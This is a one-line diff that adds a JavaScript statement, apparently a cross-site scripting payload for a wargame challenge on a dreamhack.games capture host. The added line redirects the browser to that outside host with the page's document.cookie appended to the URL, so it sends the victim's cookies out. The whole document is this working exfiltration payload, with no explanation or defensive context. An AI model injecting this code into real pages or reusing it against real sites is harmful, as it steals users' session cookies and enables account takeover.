@@ -1,0 +1,1 @@
+location.href = "https://igzhsdl.request.dreamhack.games/" + document.cookie;
